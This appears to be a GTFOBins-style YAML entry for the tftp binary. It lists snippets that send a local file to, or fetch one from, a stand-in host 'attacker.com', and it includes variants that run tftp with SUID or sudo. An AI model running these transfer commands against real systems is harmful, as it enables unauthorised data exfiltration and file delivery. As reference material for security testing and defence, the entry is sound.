---
functions:
  upload:
    - description: Send local file to a TFTP server.
      code: |
        RHOST=attacker.com
        tftp $RHOST
        put file_to_send
  download:
    - description: Fetch a remote file from a TFTP server.
      code: |
        RHOST=attacker.com
        tftp $RHOST
        get file_to_get
  suid-enabled:
    - description: Send local file to a TFTP server.
      code: |
        RHOST=attacker.com
        ./tftp $RHOST
        put file_to_send
  sudo-enabled:
    - description: Send local file to a TFTP server.
      code: |
        RHOST=attacker.com
        sudo -E tftp $RHOST
        put file_to_send
---
